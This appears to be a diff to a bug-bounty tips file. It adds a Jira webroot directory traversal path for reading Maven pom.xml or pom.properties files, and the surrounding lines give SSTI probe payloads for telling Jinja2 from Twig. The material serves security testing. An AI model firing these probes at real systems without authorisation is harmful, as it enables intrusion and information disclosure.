@@ -81,3 +81,10 @@ We need to identify what template engine is used in the back-end as well to expl
 - `if {{ 7*'7′ }} -> 7777777` -> Its Jinja2 Engine
 - `if {{ 7*'7′ }} -> 49` -> Its Twig Engine
 #bugbountytips
+
+📅 22-Nov-2020
+## (Jira Webroot Directory Traversal)
+http://target.domain/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+OR
+-site.atlassian.net/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
+`pom.xml or txt`
